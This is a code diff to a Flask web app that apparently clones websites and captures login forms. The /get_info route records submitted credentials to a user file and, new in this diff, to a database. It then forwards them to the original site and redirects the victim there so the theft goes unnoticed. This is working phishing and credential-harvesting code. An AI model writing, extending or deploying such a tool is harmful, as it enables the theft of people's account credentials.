@@ -1,22 +1,40 @@
 from user import User
 from config import Config
 from flask import Flask, render_template, request, flash,Markup, redirect
+from flask_sqlalchemy import SQLAlchemy
 from site_duplicator import SiteDuplicator
 import logging
 import tldextract
 from state import State
 import urllib.parse
 import urllib.request
+from sql_alchemy.models import Base, DbUser, DbDetails
 
 
-def factory():
+def new_flask_app():
     flask_app = Flask(__name__)
     flask_app.config.from_object(Config)
-
     return flask_app
 
 
-app = factory()
+def sqlalchemy_db(app):
+    return SQLAlchemy(app)
+
+
+app = new_flask_app()
+ps_database = sqlalchemy_db(app)
+
+
+@app.before_first_request
+def setup():
+    # Recreate database each time for demo
+    # Base.metadata.drop_all(bind=ps_database.engine)
+    Base.metadata.create_all(bind=ps_database.engine)
+    print(ps_database.session.query(DbUser).all())
+
+# a = DbUser()
+# ps_database.session.add(a)
+# ps_database.session.commit()
 
 
 @app.route("/get_info", methods=['POST'])
@@ -29,12 +47,15 @@ def get_info():
     State.login_form = request.form
     State.current_user = User(request)
     State.current_user.create_user_file()
+    State.current_user.add_user_to_db(ps_database)
     logging.debug(get_info.__name__ + " created user file")
     if State.login_form is not None and State.prev_login_action is not None:
         print("inside if")
         data = urllib.parse.urlencode(State.login_form).encode('utf-8')             # prepare to send back form to original site
         urllib.request.urlopen(State.prev_login_action, data=data)  # send form data
     return redirect(State.prev_login_action, code=307)                        # redirect to original site
+
+
 
 
 @app.route('/dup_site', methods=['POST'])
@@ -92,5 +113,4 @@ def duplicate_site():
 
 
 if __name__ == '__main__':
-    # logging.getLogger().setLevel(logging.DEBUG)
     app.run()
